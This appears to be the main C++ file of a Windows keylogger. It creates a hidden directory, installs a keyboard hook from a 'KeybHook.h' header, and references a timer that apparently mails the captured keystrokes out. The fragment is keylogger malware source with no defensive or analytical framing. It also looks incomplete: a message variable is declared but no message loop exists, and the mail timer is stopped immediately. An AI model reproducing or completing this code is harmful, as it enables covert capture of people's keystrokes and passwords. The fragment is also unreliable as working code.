#include <iostream>
#include <windows.h>
#include "KeybHook.h"
using namespace std;

int main ()
    {
        MSG Msg;
        IO::MkDir (IO::GetOurPath (true));
        InstalHook ();
        MailTimer.Stop ();
        return 0;
    }

